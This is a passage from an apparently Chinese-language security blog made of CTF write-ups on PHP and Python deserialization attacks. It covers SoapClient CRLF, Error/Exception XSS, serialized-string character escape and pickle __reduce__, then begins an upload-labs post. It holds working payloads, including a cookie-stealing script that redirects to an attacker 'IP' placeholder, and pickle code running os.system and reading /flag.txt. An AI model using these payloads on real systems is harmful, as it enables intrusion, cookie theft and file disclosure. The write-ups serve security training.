serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line">$c = unserialize($a);</span><br><span class="line">$c-&gt;not_exists_function();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="http://img.kawhi.xyz/image-20200712164137201.png" style="high:80%;width:80%;" />

<p>从上图可以看出使用SoapClient反序列化+CRLF<strong>可以生成任意POST请求</strong>。</p>
<p>这里有一道buu的题bestphp’s revenge可以结合SoapClient和上面的session反序列化一起理解，这里有个writeup写的很详细，这里不再赘述。</p>
<p>地址：<a href="https://www.cnblogs.com/20175211lyz/p/11515519.html">https://www.cnblogs.com/20175211lyz/p/11515519.html</a></p>
<h4 id="toString的原生类"><a href="#toString的原生类" class="headerlink" title="__toString的原生类"></a>__toString的原生类</h4><p>这是我在buu上面刷到的一题名为[BJDCTF 2nd]xss之光，通过这道题来理解。</p>
<p>首先是git泄露获取到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GEzheT[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure>

<p>这里有一个echo，我们可以对<code>__toString</code>的原生类进行反序列化</p>
<p>基础知识</p>
<p>这里有两个原生类，一个Error一个Exception。</p>
<p><strong>Error</strong></p>
<p>适用于php7版本</p>
<p>这里测试代码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = unserialize($_GET[<span class="string">&#x27;yds&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到已经成功弹窗</p>
<img src="http://img.kawhi.xyz/image-20200711143646347.png" style="high:80%;width:80%;" />

<p><strong>Exception</strong></p>
<p>适用于php5、7版本</p>
<p>这个类利用的方式和原理和Error 类一模一样，但是适用于php5和php7，相对之下更加好用。</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = unserialize($_GET[<span class="string">&#x27;yds&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样成功弹窗。</p>
<img src="http://img.kawhi.xyz/image-20200711143829700.png" style="high:80%;width:80%;" />

<p>本题payload为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = serialize(<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;IP&#x27;+document.cookie&lt;/script&gt;&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>打过去即可获得flag。</p>
<h3 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a><strong>字符逃逸</strong></h3><p>字符逃逸分两种</p>
<ul>
<li>第一种为关键词数增加</li>
<li>第二种为关键词数减少</li>
</ul>
<h4 id="关键词数增加字符逃逸"><a href="#关键词数增加字符逃逸" class="headerlink" title="关键词数增加字符逃逸"></a><strong>关键词数增加字符逃逸</strong></h4><p>在做题目之前先看看字符是如何逃逸的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&#x27;123&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;defg&#x27;</span>);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string(<span class="number">49</span>) <span class="string">&quot;a:3:&#123;i:0;s:3:&quot;</span><span class="number">123</span><span class="string">&quot;;i:1;s:3:&quot;</span>abc<span class="string">&quot;;i:2;s:4:&quot;</span>defg<span class="string">&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>这时候再反序列化回来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">array(<span class="number">3</span>) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(<span class="number">3</span>) <span class="string">&quot;123&quot;</span></span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(<span class="number">3</span>) <span class="string">&quot;abc&quot;</span></span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">&quot;defg&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到反序列化是以<code>&quot;;&#125;</code>结束的。</p>
<p>如果这里我们把<code>abc</code>换成<code>abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;</code></p>
<p>运行的结果是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">array(<span class="number">3</span>) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(<span class="number">3</span>) <span class="string">&quot;123&quot;</span></span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(<span class="number">3</span>) <span class="string">&quot;abc&quot;</span></span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">&quot;qwert&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就可以看到字符串成功逃逸出来。现在回到题目中，这是也是一道buu上的题目名为[0CTF 2016]piapiapia，这题是扫目录先扫出来<a href="http://www.zip./">www.zip。</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	<span class="keyword">if</span>($profile  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		$email = $profile[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先发现flag在config.php里面，我们构造包含config.php的数据，利用字符串逃逸，然后在profile.php中读取出来。</p>
<p>看到update.php这里</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure>

<p>这里的参数都是可控的，我们需要把photo的值替换为<code>config.php</code>，在nickname后面加上<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，这样的话后面的代码就不再执行了。</p>
<p>这里nickname是有限制的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			die(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>然鹅这个限制数组即可绕过：nickname[]=</p>
<p>$profile序列化之后长这样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;ss@q.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/327a6c4304ad5938eaf0efb6cc3e53dc&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>然后再看class.php下面的关键代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">	$username = parent::filter($username);</span><br><span class="line">	$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">	$where = <span class="string">&quot;username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">	return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">	$escape = array(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">	$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">	$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">	$safe = array(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">	$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就是我们字符串逃逸利用的地方</p>
<p>我们的目的是想让<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>被拼接在反序列化字符串里，而不是被当做nickname的值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$profile = a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:8:&quot;</span>ss@q.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;a:1:&#123;i:0;s:204:&quot;</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;&#125;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">39</span>:<span class="string">&quot;upload/327a6c4304ad5938eaf0efb6cc3e53dc&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>的长度为34个字符，如果我们不想把他作为nickname的值，就需要逃逸34个字符，需要把where换成hacker，然后就可以成功逃逸。因为<code>&quot;;&#125;</code>是反序列闭合的标志，后面的upload就不用管了。然后在profile.php里面photo就会读取到config.php的值。</p>
<p>然后接下来就是注册登录然后在update.php里面上传nickname，然后在profile.php打开图片查看base64编码的config.php，即可查看flag。</p>
<h4 id="关键词数减少字符逃逸"><a href="#关键词数减少字符逃逸" class="headerlink" title="关键词数减少字符逃逸"></a><strong>关键词数减少字符逃逸</strong></h4><p>这里是一道buu上的[安洵杯 2019]easy_serialize_php题目</p>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果是关键词减少的话有两种办法</p>
<p><strong>值逃逸</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=p<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;s:2:&quot;</span>a<span class="string">b&quot;;s:2:&quot;</span>s<span class="string">b&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>首先这里是题目正常反序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们post上传序列化后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">60</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ab&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;sb&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以看到24直接把<code>&quot;;s:8:&quot;function&quot;;s:60:&quot;p</code>包含进去了，所以后面的img可以逃逸出来读flag。</p>
<p><strong>键逃逸</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:<span class="number">2</span>:<span class="string">&quot;db&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>我们post上传序列化后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">49</span>:<span class="string">&quot;;s:2:&quot;</span>d<span class="string">b&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到7直接把<code>&quot;;s:49:</code>包含进去了，后面的img可以逃逸出来读flag。</p>
<h1 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a><strong>python反序列化</strong></h1><p>这里参考：<a href="https://xz.aliyun.com/t/7751#toc-1">https://xz.aliyun.com/t/7751#toc-1</a></p>
<p><code>python</code>中序列化一般有两种方式：<code>pickle</code>模块和<code>json</code>模块，前者是<code>python</code>特有的格式，后者是<code>json</code>通用的格式。</p>
<p>以下均显示为<code>python2</code>版本序列化输出结果，<code>python3</code>的<code>pickle.dumps</code>结果与<code>python2</code>不一样。</p>
<ul>
<li>pickle</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">dict = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&#x27;kawhi&#x27;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">19</span>&#125;</span><br><span class="line">a = pickle.dumps(dict)</span><br><span class="line">print(a, type(a))</span><br><span class="line">b = pickle.loads(a)</span><br><span class="line">print(b, type(b))</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&quot;(dp0\nS&#x27;age&#x27;\np1\nI19\nsS&#x27;name&#x27;\np2\nS&#x27;kawhi&#x27;\np3\ns.&quot;</span>, &lt;type <span class="string">&#x27;str&#x27;</span>&gt;)</span><br><span class="line">(&#123;<span class="string">&#x27;age&#x27;</span>: <span class="number">19</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;kawhi&#x27;</span>&#125;, &lt;type <span class="string">&#x27;dict&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>

<ul>
<li>json</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">dict = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&#x27;kawhi&#x27;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">19</span>&#125;</span><br><span class="line">a = json.dumps(dict, indent=<span class="number">4</span>)</span><br><span class="line">print(a, type(a))</span><br><span class="line">b = json.loads(a)</span><br><span class="line">print(b, type(b))</span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;&#123;\n    &quot;age&quot;: 19, \n    &quot;name&quot;: &quot;kawhi&quot;\n&#125;&#x27;</span>, &lt;type <span class="string">&#x27;str&#x27;</span>&gt;)</span><br><span class="line">(&#123;<span class="string">u&#x27;age&#x27;</span>: <span class="number">19</span>, <span class="string">u&#x27;name&#x27;</span>: <span class="string">u&#x27;kawhi&#x27;</span>&#125;, &lt;type <span class="string">&#x27;dict&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>

<p>再看一个pickle模块导致的安全问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">obj</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (a, ))</span><br><span class="line"></span><br><span class="line">r = pickle.dumps(obj())</span><br><span class="line">print(r)</span><br><span class="line">pickle.loads(r)</span><br></pre></td></tr></table></figure>

<p>先输出<code>obj</code>对象的序列化结果，再将其反序列化，输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cnt</span><br><span class="line">system</span><br><span class="line">p0</span><br><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">p1</span><br><span class="line">tp2</span><br><span class="line">Rp3</span><br><span class="line">.</span><br><span class="line">desktop-t6u2ptl\think</span><br></pre></td></tr></table></figure>

<p>成功执行了whoami命令。</p>
<p>这里同样通过一道题来理解，buu上面的[CISCN2019 华北赛区 Day1 Web2]ikun</p>
<p>前面的操作是通过JWT获取到源码，源码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>第<code>19</code>行处直接接收<code>become</code>经<code>url</code>解码与其反序列化的内容，存在反序列化漏洞，构造<code>payload</code>读取<code>flag.txt</code>文件，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>

<p>传参给become即可拿到flag。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2020/05/04/upload-labs/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>练习一下文件上传漏洞，项目地址：<a class="foo" href="https://github.com/c0ny1/upload-labs" target="_blank">传送门</a></p>
<h4 id="Pass-01-js检查"><a href="#Pass-01-js检查" class="headerlink" title="Pass-01(js检查)"></a><strong>Pass-01(js检查)</strong></h4><p>前端js检查：</p>
<p>1.首先打开burp和浏览器</p>
<p>2.上传1.php文件进行观察</p>
<p>3.这里发现，http请求都没通过burp就弹出了不允许上传的提示框，这表明验证点在前端，而不在服务端</p>
<img src="http://img.kawhi.xyz/image-20200502124534442.png" style="high:100%;width:100%;" />

<p>这里可以按F12查看源码：</p>
